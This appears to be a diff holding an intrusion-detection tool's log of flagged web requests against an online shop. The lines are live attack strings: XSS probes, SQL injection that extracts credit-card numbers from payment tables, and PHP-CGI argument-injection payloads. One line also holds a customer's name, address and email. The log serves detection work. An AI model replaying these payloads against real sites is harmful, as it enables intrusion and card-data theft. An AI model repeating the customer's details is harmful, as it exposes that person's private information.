@@ -1,0 +1,1762 @@
+Ready to Load Ids Singature file 'idsSig.xml'...
+Total Singatures are 76...
+ Start to read and parse logs ! Total logs are 3271971...
+============================================
+xss Attack: Cross-Site Scripting 
+
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000AD')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000002D')</script>
+attack:6  /change_payment_card.php?order_id=51465722 and(select 1 from(select count(*),concat((select (select concat(payment_cards_id,"|",customers_id,"|",cc_type,"|",cc_number_display,"|",cc_expires,"|",address_book_id)) from bdgweb_oscsmartsubinnodb.payment_cards order by payment_cards_id desc limit 0,1),floor(rand(0)*2))x from bdgweb_oscsmartsubinnodb.payment_cards group by x)a) and 1=1--
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000BE')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000046')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000090')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000009A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000004B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000025')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000CA')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000001B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B4')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000013')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000089')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D2')</script>
+attack:5  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(customers_id,":",cc_number) FROM orders LIMIT 7,1)))--
+attack:5  /Scripts/jquerybundle?v=<script>alert('TK00000117')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D9')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000008B')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_mem_bin/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A3')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000004C')</script>
+attack:5  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(payment_cards_id,":",cc_number) FROM orders LIMIT 7,1)))--
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B0')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C6')</script>
+attack:5  /Error/Unknown?aspxerrorpath=/mailto:question@gsnutsandchocolates.com
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_derived/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000085')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.8.1/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A4')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000033')</script>
+attack:5  /include/editor/dialogs/dialog.php?module=spawfm&dialog=spafm
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000075')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000001D')</script>
+attack:5  /Scripts/customjsbundle?<script>alert('TK00000122')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000024')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000006D')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.6.2/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000002A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000084')</script>
+attack:5  /express/defaultr.aspx?partnerId=REDACTEDSTSP00001&sfn=Terry&sln=Kellum&sa1=2329 Dahlen Ave&sa2=Attn: Merc 1508&sc=Terre Haute&ss=IN&sz=47805&se=bob.kellum@gmail.com
+attack:5  /Error/.svn/entries
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_errors/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /cgi-bin/php?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000AF')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000000C')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000032')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000079')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.6/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /cgi-bin/php-cgi?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000044')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000082')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000BA')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000069')</script>
+attack:5  /Error/NotFound?<script>alert('TK00000005')</script>
+attack:5  /Error/.DS_Store
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E0')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000014')</script>
+attack:5  /Scripts/modernizrbundle?v=<script>alert('TK00000120')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000094')</script>
+attack:5  /cgi-bin/php.fcgi?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /Scripts/customjsbundle?v=<script>alert('TK00000126')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A1')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000098')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000BB')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000008D')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/.cobalt/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A8')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000021')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000048')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000007E')</script>
+attack:5  /<script>alert('TK00000002')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000007D')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.6/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000053')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000009C')</script>
+attack:5  /_archive/.svn/entries
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/.cobalt/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000DE')</script>
+attack:5  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(":",cc_number) FROM orders where customers_id = 18400099 LIMIT 7,1)))--
+attack:5  /content/?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /Content/css/cssbundle?v=<script>alert('TK00000108')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000EE')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000076')</script>
+attack:5  /SMSReporting_XYZ/.DS_Store
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000003E')</script>
+attack:6  /modules/Submit/index.php?op=pre&title=<script>alert("test");</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000020')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000017')</script>
+attack:5  /$(el).attr(
+attack:5  /_derived/.svn/entries
+attack:5  /phpslash/-0/.8/?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C7')</script>
+attack:6  /corporate_info.php?content=corp_mgt' aND BeNChMaRK(2999999,Md5(NoW())) AnD '1
+attack:5  /_backup/.DS_Store
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000006E')</script>
+attack:5  /Scripts/jquerybundle?v=<script>alert('TK00000116')</script>
+attack:5  /lib/spaw2/dialogs/dialog.php?module=spawfm&dialog=spafm
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_archive/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C5')</script>
+attack:5  /Home/Index?<script>alert('TK00000129')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.6.1/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000002C')</script>
+attack:5  /_errors/.DS_Store
+attack:5  /Scripts/modernizrbundle?<script>alert('TK0000011A')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.8/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(":",cc_number) FROM orders where payment_cards_id = 0 LIMIT 964175,1)))--
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000100')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000FE')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_pages/<script>document.cookie="testxjwa=7156;"</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_objects/<script>document.cookie="testxjwa=7156;"</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.6.1/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D8')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000018')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000DD')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000CB')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000AE')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000043')</script>
+attack:5  /Scripts/customjsbundle?<script>alert('TK00000121')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000007A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E8')</script>
+attack:6  /calendar.php?year=2011&month="<script>alert("Trustkeeper")</script>&day=01
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000005A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000015')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000005B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000099')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000063')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B8')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000071')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/SMSReporting_XYZ/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000001A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000EA')</script>
+attack:5  /Content/themes/base/cssbundle?<script>alert('TK0000010A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B6')</script>
+attack:5  /Scripts/customjsbundle?v=<script>alert('TK00000127')</script>
+attack:5  /include/spaw2/dialogs/dialog.php?module=spawfm&dialog=spafm
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_old/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F0')</script>
+attack:5  /phpslash/-0/.6/.1/?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /Nut/Home/SwitchView?mobile=False&returnUrl=/Nut/Error/Unknown?aspxerrorpath=/nut/landing/0/b5cefd32-43ce-4541-9765-c05f5f36765d%3Chttp:/links.m2mediagroup.mkt5971.com/ctt
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_archive/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000049')</script>
+attack:5  /_utils/.svn/entries
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000CE')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F9')</script>
+attack:5  /lib/editor/dialogs/dialog.php?module=spawfm&dialog=spafm
+attack:5  /_utils/.DS_Store
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_mem_bin/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Scripts/customjsbundle?v=<script>alert('TK00000128')</script>
+attack:5  /_derived/.DS_Store
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000003B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000009D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000058')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000EB')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E3')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000026')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000000D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000FF')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E4')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000FD')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.7.2/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.6.5/<script>document.cookie="testxjwa=7156;"</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.8.1/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(payment_cards_id,":",cc_number) FROM orders where LIMIT 7,1)))--
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C4')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_cti_pvt/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Content/themes/base/cssbundle?v=<script>alert('TK0000010D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000057')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000BD')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/mod_status?<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.6.2/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000091')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000087')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F7')</script>
+attack:5  /Scripts/modernizrbundle?v=<script>alert('TK0000011D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000004E')</script>
+attack:5  /Content/css/cssbundle?v=<script>alert('TK00000107')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000007F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000001F')</script>
+attack:5  /phpslash/-0/.7/.1/?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /SMSReporting_XYZ/.svn/entries
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D5')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000006F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000005D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D3')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000CF')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A6')</script>
+attack:5  /Scripts/modernizrbundle?<script>alert('TK00000119')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000072')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000060')</script>
+attack:6  /Campaign/Error/NotFound?aspxerrorpath=/campaign/(f(2ewt_ygmarlagti7sw4tvhj0zk17klgxnhnk1aawgtixm5x-2qmvsvouolvaffrhitumf4wnk496p2dbzmkc3ywfloksiixdtrlawmt78f_mg-45kdzzpdlnogeishkcgtotelf6gqmu2ia0i1j5lfgmcvw1))/home/index
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000005F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000002F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A5')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000016')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F1')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000000F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000CC')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D7')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000045')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000034')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000097')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000006B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E6')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000010')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C2')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000059')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D6')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000088')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000068')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000095')</script>
+attack:5  /Scripts/modernizrbundle?v=<script>alert('TK0000011F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B2')</script>
+attack:5  /Content/themes/base/cssbundle?v=<script>alert('TK00000110')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000008E')</script>
+attack:5  /admin/.DS_Store
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_utils/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Content/css/cssbundle?v=<script>alert('TK00000106')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E2')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000008C')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000DA')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000BF')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/SMSReporting_XYZ/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000006C')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_fpclass/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /cgi-bin/php4?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000EF')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C8')</script>
+attack:5  /redeem/Content/Css/..images/bd-drinks.jpg
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000008F')</script>
+attack:5  /lib/spaw/dialogs/dialog.php?module=spawfm&dialog=spafm
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000AC')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000070')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000086')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_old/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000003D')</script>
+attack:5  /_cti_pvt/.DS_Store
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000062')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A9')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000065')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000004A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000096')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000027')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000001C')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A0')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000006A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000BC')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000077')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_cti_pvt/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000041')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.7.1/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000DF')</script>
+attack:5  /_archive/.DS_Store
+attack:5  /content/.svn/entries
+attack:5  /bdgdb/file_manager.php?goto=C:/Repository/Web/REDACTED.com//download
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_notes/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000074')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000042')</script>
+attack:5  /_cti_pvt/.svn/entries
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000007C')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E1')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000EC')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F5')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000CD')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A2')</script>
+attack:6  /corporate_info.php?content=corp_mgt' or (1,2)=(select*from(select name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a) -- 'x'='x
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000004D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000030')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B5')</script>
+attack:6  /campaign/(f(2ewt_ygmarlagti7sw4tvhj0zk17klgxnhnk1aawgtixm5x-2qmvsvouolvaffrhitumf4wnk496p2dbzmkc3ywfloksiixdtrlawmt78f_mg-45kdzzpdlnogeishkcgtotelf6gqmu2ia0i1j5lfgmcvw1))/home/index
+attack:6  /corporate_info.php?content=corp_mgt or (1,2)=(select*from(select name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a) -- and 1=1
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000039')</script>
+attack:6  /corporate_info.php?content=corp_mgt" or (1,2)=(select*from(select name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a) -- "x"="x
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000056')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000002E')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A7')</script>
+attack:5  /SMSReporting_XYZ/?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000022')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000040')</script>
+attack:5  /$.extend({},
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.61/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E9')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000012')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000002B')</script>
+attack:5  /phpslash/-0/.61/?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.7.2/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Content/css/cssbundle?v=<script>alert('TK00000105')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000003C')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000FB')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000051')</script>
+attack:5  /Scripts/modernizrbundle?v=<script>alert('TK0000011E')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000FA')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000009B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D4')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000DB')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.6.5/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Content/themes/base/cssbundle?<script>alert('TK00000109')</script>
+attack:5  /admin/spaw2/dialogs/dialog.php?module=spawfm&dialog=spawfm&theme=spaw2lite&type=imagesundefined
+attack:5  /Scripts/jquerybundle?v=<script>alert('TK00000115')</script>
+attack:5  /bdgdb/file_manager.php?goto=C:/Repository/Web/REDACTED.com//templates
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000081')</script>
+attack:5  /Admin/Account/Login?ReturnUrl=/Admin&utm_source=SUM 503&utm_campaign=2b9d4f7c61-SNAP-2015-10-17 17:58:32&utm_medium=email&utm_term=0_fa50f40495-2b9d4f7c61-[LIST_EMAIL_ID]&ct=t(SNAP-2015-10-17 17:58:32)&goal=0_fa50f40495-2b9d4f7c61-[LIST_EMAIL_ID]&mc_cid=2b9d4f7c61&mc_eid=[UNIQID]
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000000A')</script>
+attack:5  /Error/NotFound?<script>alert('TK00000006')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000035')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000052')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000038')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000019')</script>
+attack:6  /corporate_info.php?content=corp_mgt'&&BeNChMaRK(2999999,mD5(NOW()))&&'1
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000005E')</script>
+attack:5  /_backup/.svn/entries
